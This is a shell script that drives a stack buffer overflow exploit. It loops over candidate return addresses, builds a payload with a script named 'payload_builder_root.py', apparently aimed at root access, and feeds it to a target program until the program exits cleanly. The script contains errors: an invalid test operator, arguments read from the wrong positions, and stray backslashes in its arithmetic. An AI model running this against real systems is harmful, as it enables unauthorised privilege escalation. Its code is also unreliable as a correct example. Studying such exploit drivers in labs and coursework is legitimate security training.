#!/bin/sh

DEFAULT_BUFFER_SIZE=128
DEFAULT_OFFSET=0
MAX_STEPS=300
i=0

#exec 2> /dev/null

if [ $# -e 0 ]
then
	echo "Usage: $0 program [buffer_size] [offset]"
	exit 1
fi

program=$1

if [ $# -ge 2 ] 
then
	DEFAULT_BUFFER_SIZE=$1
fi
if [ $# -ge 3 ]
then
	DEFAULT_OFFSET=$2
fi

while [ $i -le $MAX_STEPS ]
do
	RET_ADDRESS=$( ./sp_address "$DEFAULT_BUFFER_SIZE" "$(($DEFAULT_OFFSET \+ $i))") 
	python3 payload_builder_root.py "$RET_ADDRESS"
	$1 $( cat payload_root.bin )
	if [ $? -eq 0 ]
	then
		echo "Payload found succesfully..."
		echo "Correct return address was $RET_ADDRESS"
		exit
	fi
	i=$(( i \+ 1))
done

